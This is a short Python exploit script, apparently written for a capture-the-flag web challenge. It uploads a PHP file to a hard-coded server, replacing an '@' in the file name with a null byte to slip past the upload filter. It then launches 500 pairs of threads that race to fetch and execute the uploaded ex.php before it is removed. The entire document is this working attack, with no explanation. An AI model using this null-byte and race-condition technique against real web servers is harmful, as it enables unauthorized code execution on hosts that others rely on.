import threading
import requests

def upload():
    url = 'http://3.39.6.7:8000/index.php?path=/var/www/html/uploads/21ffe49ba09df60670e4bcc21cd5457c/ex.php'  


    cookies = {'PHPSESSID': 'a2v7saiouf38n3672epjbgje0r'}

    sess = requests.Session()
    with open('ex.php', 'rb') as file:
        files = {'file': ('ex.php@1', file)}
        request = requests.Request('POST',url,cookies=cookies, files=files)
        request = request.prepare()
        request.body = request.body.replace(b'@',b'\x00')
        response = sess.send(request)
        # print(response.text)

def read():
    url= 'http://3.39.6.7:8000/uploads/21ffe49ba09df60670e4bcc21cd5457c/ex.php'
    res = requests.get(url)
    if res.status_code == 200:
        print(res.status_code)
        print(res.text)


for i in range(500):
    t1 = threading.Thread(target=upload)
    t2 = threading.Thread(target=read)
    t1.start()
    t2.start()

upload()